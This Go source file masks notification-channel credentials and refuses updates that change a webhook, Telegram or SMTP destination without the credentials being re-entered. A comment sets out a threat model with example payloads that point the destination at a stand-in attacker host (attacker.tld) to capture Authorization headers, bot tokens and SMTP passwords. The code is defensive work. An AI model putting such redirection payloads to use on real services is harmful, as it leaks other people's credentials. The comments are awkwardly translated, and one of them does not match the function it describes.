package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix has a mask value prefix. When API echoes credentials, it replaces the real content with a value prefixed by this.
// When an update interface receives a value with this prefix, it understands that 'keep the original value in the library'.
//
// Use prefix instead of empty string or fixed constant to carry some identifiable information.
// (See MaskedValue), allowing users to distinguish which robot it is without having to re-paste the key.
const MaskedPrefix = "__masked__"

// MaskedValue Generate a mask value:
//
//	"__masked__" Original value too short, no hints given
//	"__masked__:…ab12cd" Append the original value's last 6 digits as an identifier hint.
//
// Only exposing the last 6 digits is intentional: Webhook address recognition information is in the latter segment (like WeChat's key,
// Feishu robot ID), while the prefix part of all robots is the same and lacks recognition value. The last 6 digits are insufficient
// Restore credentials but enough to let the configurator recognize 'it's my group'.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked Report whether a value is a mask value (i.e., not modified after interface echo).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig Return a copy of the configuration, replacing the credential field with a masked value.
//
// Return an empty map for unknown channel types instead of the original configuration.——Rather than let the UI display 'Configuration Unavailable',
// Also, don't return potentially containing credentials in their original form when channel type cannot be recognized.
// Non-credential fields should be retained as-is for proper UI display.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok:= Get(kind)
	if!ok {
		return map[string]any{}
	}
	secrets:= map[string]bool{}
	for _, k:= range channel.SecretKeys() {
		secrets[k] = true
	}
	out:= make(map[string]any, len(cfg))
	for k, v:= range cfg {
		if!secrets[k] {
			out[k] = v
			continue
		}
		// headers This nested structure should be treated as one credential; each sub-key is judged to need each channel
		// Declare another set of rules for which sub-keys are credentials; complexity far exceeds the benefits.
		if s, ok:= v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials Indicates 'target address changed, but the caller no longer needs credentials (retaining clear semantics)'
// Credentials fielddeclaration'. Return it instead of silently allowing or discarding credentials, reasons in PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // Destination key for changes
	Missing []string // Credentials key without explicit statement
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "Target address (" + strings.Join(e.Changed, ", ") + ") changed; please re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + "): fill in the new value, or explicitly leave it empty to drop the credentials." +
		"Original credentials only work for old addresses. Continuing to use it means handing it over to the new address."
}

// PrepareConfigUpdate Merge channel configurations and handle the 'target address change' security-sensitive situation.
//
// It replaces the bare MergeConfig used in channel update paths, solving this feasible path:
// Target address (where messages are sent) and credentials (who to send as) are two independent fields, while MergeConfig
// Retain the original value from the database for 'unmentioned keys'. Thus, anyone who can PATCH a channel can**Only change address,
// Avoids talking about credentials**, So that the server can send real credentials to its controlled endpoint:
//
//	webhook {config:{url:"https://attacker.tld"}} → Original Authorization header sent with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<True Token>/sendMessage
//	email {config:{host:"smtp.attacker.tld"}} → STARTTLS Hand over username and password later
//
// This path should be completely silent and not depend on redirects (so rejecting cross-host jumps won't stop it),
// And it bypassed the target of this package's masking mechanism directly.——'Credentials not echoed to the browser.
//
// Rule: As long as any destination key is changed to a new value, the caller must validateHTTPURL / url**Each one**Credential key explicitly states:
// - Provide New Value → Use new value
// - Explicitly pass an empty string → The old credential should not be carried over when changing the target address**.
// - Only change the request method, address and credentials remain unchanged', → Delete
//
// The third one also rejects because 'mask value' means 'reusing old credentials', while old credentials
// Only valid for old addresses. Here it deliberately does not perform 'automatic credential discard'.——For optional credential fields
// (webhook Headers and email passwords will silently become 'auth gone but interface returns 200'.
// Harder to debug than errors. Rather have the operator fill in more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok:= Get(kind)
	if!ok {
		return nil, fmt.Errorf("Channel Type %q Unregistered", kind)
	}
	secrets:= channel.SecretKeys()
	destinations:= channel.DestinationKeys()

	// Credential values that are not strings (like webhook headers being an object) can contain masking literals,
	// It explains that the caller has put a sentinel for 'keep original value' inside the structure. MergeConfig only recognizes 'string
	// Prefixes are treated as masks and will be stored as ordinary objects.——Literal really falls into the library
	// "__masked__", Subsequent authentication silently fails with no error. Rather reject it.
	//
	// This check must be placed**At the beginning**: When the address hasn't changed, it will return early. Placing it later means it equals
	// Only covered the 'change address' path (the first version was wrong here, testing directly caught it).
	if err:= rejectMaskedInContainers(incoming, secrets); err!= nil {
		return nil, err
	}

	// Find the truly changed destination key. Mask value equals 'unchanged'.
	var changed []string
	for _, key:= range destinations {
		raw, present:= incoming[key]
		if!present {
			continue
		}
		s, isStr:= raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if!sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged, perform normal merge (mask value retains original value, empty string clears, others overwrite).
		return MergeConfig(stored, incoming), nil
	}

	// The address has changed: it requires an explicit statement for each credential key.
	var missing []string
	for _, key:= range secrets {
		raw, present:= incoming[key]
		if!present {
			missing = append(missing, key)
			continue
		}
		if s, isStr:= raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers Refuse to embed mask sentinels in non-string structures.
//
// The premise of the masking mechanism is 'the entire value is a string'. Like webhook headers, these are object fields,
// Can only be masked as a whole (written as a string) "__masked__")Or submit as a whole; put the sentinel inside the object.
// Cannot express 'unchanged', but will be stored as a real value in the database.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key:= range secretKeys {
		raw, present:= incoming[key]
		if!present {
			continue
		}
		if _, isStr:= raw.(string); isStr {
			continue
		}
		encoded, err:= json.Marshal(raw)
		if err!= nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("Field %s Content contains mask markers. %q: This field can only be left empty as a whole to inherit, or submitted with new values as a whole, it cannot contain masked placeholders within the structure.",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue Compare two configuration values for equivalence. Using JSON serialization to handle
// Type difference——The frontend submits ports as number, while the library reads them back as float64, directly == may misjudge.
//
// ''empty' must be normalized before comparison: An empty string and 'key not found' are considered the same state in this configuration model,
// because MergeConfig treats an empty string as explicit clearing and directly deletes that key. Without normalization, one
// Always leave empty optional destination field (Telegram's base_url is the only such field: leave empty to use
// The official address) will follow this path.——
//
//	Save the base_url when creating.:"" → First save deleted by MergeConfig
//	→ When saving for the second time, incoming is "", stored Missing key, judged as 'address changed'.
//	→ Credentials are masked values → 400'Target address has changed, please re-enter credential fields simultaneously
//
// After each save fails, unless the user re-pastes the Bot Token again, and he has made no changes.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA:= json.Marshal(a)
	rb, errB:= json.Marshal(b)
	if errA!= nil || errB!= nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue Determine if a configuration value is 'empty'.
// The passphrase must match the emptying criteria of MergeConfig (strings.TrimSpace(s) == ""),
// Only authenticated via URL key; no signing supported—so webhook address itself is all the credentials.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok:= v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig Merge incoming into stored to update channel configuration.
//
// Rules:
// - incoming Keys with mask values → Retain the stored original value (user did not change this field)
// - incoming Keys with empty string values → Considered explicit clear, delete this key
// - Other keys → Override with incoming value.
// - stored Keys present in outgoing but not in incoming → Retain (partial update semantics)
//
// Whether an empty string counts as 'clear' needs clarification: frontend forms submit empty strings for unfilled fields,
// If written as a valid value, it will really clear the 'leave empty to retain original value' field.
// Here we choose to explicitly clear it because when clearing an incorrectly set field, there is no other way for the user to express it.
// (Dragging a field distinguishes between 'not provided' and 'provided empty', but the UI doesn't need this distinction.
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out:= make(map[string]any, len(stored)+len(incoming))
	for k, v:= range stored {
		out[k] = v
	}
	for k, v:= range incoming {
		if s, ok:= v.(string); ok {
			if IsMasked(s) {
				continue // Masked Value = Not modified, retaining stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
